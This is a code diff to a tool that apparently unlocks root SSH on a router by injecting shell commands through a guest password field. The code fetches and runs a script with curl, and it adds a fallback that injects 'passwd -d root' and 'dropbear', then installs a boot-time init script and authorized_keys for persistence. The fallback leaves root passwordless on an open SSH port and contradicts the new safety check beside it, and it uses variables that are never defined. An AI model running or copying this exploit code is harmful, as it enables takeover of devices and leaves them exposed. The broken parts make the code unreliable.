@@ -323,10 +323,14 @@ class Injector:
 
     def __init__(self, salt: str | None = None):
         self.salt = salt or random_salt()
+        self.staging_path = STAGING_PATH
 
     def encode(self, command: str) -> str:
         expr = command.replace(" ", "${IFS}")
         password = f"{self.salt}$({expr})"
+        if len(password) > PASSWORD_MAX and len(self.salt) > 2:
+            salt = self.salt[:2]
+            password = f"{salt}$({expr})"
         if len(password) > PASSWORD_MAX:
             over = len(password) - PASSWORD_MAX
             raise IduError(
@@ -341,9 +345,19 @@ class Injector:
         return password
 
     def download(self, address: str, path: str = STAGING_PATH) -> str:
-        return self.encode(f"curl {address}>{path}")
+        cmd = f"curl {address}>{path}"
+        expr = cmd.replace(" ", "${IFS}")
+        if len(f"{self.salt}$({expr})") > PASSWORD_MAX and path == STAGING_PATH:
+            cmd = f"curl {address}>a"
+            path = "a"
+        self.staging_path = path
+        expr = cmd.replace(" ", "${IFS}")
+        if len(f"{self.salt}$({expr})") > PASSWORD_MAX:
+            return Injector(self.salt[:2]).encode(cmd)
+        return self.encode(cmd)
 
-    def execute(self, path: str = STAGING_PATH) -> str:
+    def execute(self, path: str | None = None) -> str:
+        path = path or self.staging_path
         return self.encode(f"sh {path}")
 
     def literal(self, length: int = 16) -> str:
@@ -761,6 +775,21 @@ class PasswordVector(Vector):
         elif self.force:
             print("    warning: no password history recorded; forcing the "
                   "payloads anyway")
+        elif "passwdHistory" not in guest:
+            # Some builds omit passwdHistory entirely. Without another execution
+            # signal, this field cannot establish whether injection is active.
+            # A slow successful request does not prove that the shell evaluated
+            # the password. Do not send exploit payloads without independent evidence.
+            raise UnsupportedFirmware(
+                "this build omits passwdHistory, so shell execution cannot be "
+                "confirmed safely.\n"
+                "    Pass --force only if you have independently verified this "
+                "firmware is injectable.\n"
+                "    If the web UI still offers Backup and Restore, use the\n"
+                "    offline breeze method instead:\n"
+                f"      {BREEZE_GUIDE}\n"
+                "      ./flash.sh breeze <config-backup>\n"
+                "    Otherwise the fallback is the u-boot/UART console.")
         else:
             raise UnsupportedFirmware(
                 "this build does not record password history, so the "
@@ -1021,9 +1050,65 @@ def unlock(api: Api, key_path: str | None, password: str, port: int = 80,
                     raise IduError(
                         "the installer ran but sshd never came up. Last beacon:\n"
                         f"    {beacon.hits[-1].replace(chr(10), chr(10) + '    ')}")
-                print(f"    Method {number}/{total}: failed (the router accepted "
-                      f"the payloads but never fetched http://{address}:{port}/)")
-                continue
+
+                # If the HTTP callback failed (e.g. firewall or client isolation),
+                # attempt direct in-band execution to enable dropbear directly.
+                print(f"    Method {number}/{total}: callback was not received. "
+                      "Attempting direct command injection...")
+                bootstrap_shell = None
+                try:
+                    with api.session("admin", password, patience):
+                        guest = api.guest_record()
+                        api.set_password(guest["recordId"], Injector().encode("passwd -d root"))
+                        time.sleep(1)
+                        api.set_password(guest["recordId"], Injector().encode("dropbear -R -p 22"))
+                    bootstrap_shell = Shell(api.host, password="")
+                    bootstrap_shell.wait(15, "the router")
+                except Exception as problem:
+                    detail = str(problem)
+                    if password:
+                        detail = detail.replace(password, "[redacted]")
+                    print(f"    Direct fallback failed ({type(problem).__name__}): "
+                          f"{detail}", file=sys.stderr)
+
+                if bootstrap_shell is None or not bootstrap_shell.alive():
+                    print(f"    Method {number}/{total}: failed (the router accepted "
+                          f"the payloads but never fetched http://{address}:{port}/)")
+                    continue
+
+                # Direct command injection succeeded! Configure keys and persistence via SSH.
+                print("[*] Direct injection succeeded, configuring SSH persistence...")
+                persist_cmd = (
+                    "passwd -d root; "
+                    "cat > /etc/init.d/idu-ssh <<'INIT'\n"
+                    "#!/bin/sh /etc/rc.common\n"
+                    "START=99\nSTOP=01\n"
+                    "start() { dropbear -R -p 0.0.0.0:22 >/dev/null 2>&1; return 0; }\n"
+                    "stop()  { killall dropbear >/dev/null 2>&1; return 0; }\n"
+                    "reload() { start; }\n"
+                    "INIT\n"
+                    "chmod +x /etc/init.d/idu-ssh; "
+                    "ln -sf ../init.d/idu-ssh /etc/rc.d/S99idu-ssh; "
+                    "ln -sf ../init.d/idu-ssh /etc/rc.d/K01idu-ssh"
+                )
+                if pubkey:
+                    persist_cmd += (
+                        f"; mkdir -p /root/.ssh /etc/dropbear; "
+                        f"echo {shlex.quote(pubkey.strip())} >> /root/.ssh/authorized_keys; "
+                        f"echo {shlex.quote(pubkey.strip())} >> /etc/dropbear/authorized_keys; "
+                        f"chmod 600 /root/.ssh/authorized_keys /etc/dropbear/authorized_keys; "
+                        f"chmod 700 /root/.ssh"
+                    )
+                result = bootstrap_shell._exec(
+                    ["ssh"] + bootstrap_shell._opts()
+                    + [f"{bootstrap_shell.user}@{bootstrap_shell.host}", persist_cmd],
+                    timeout=60)
+                if result.returncode != 0:
+                    raise IduError("could not configure SSH persistence: "
+                                    f"{result.stderr.strip()[:200]}")
+                if key_path and not shell.alive():
+                    raise IduError("SSH persistence was installed, but the supplied key "
+                                    "could not authenticate")
 
             print(f"    Method {number}/{total}: success")
             print("[+] Root SSH enabled")
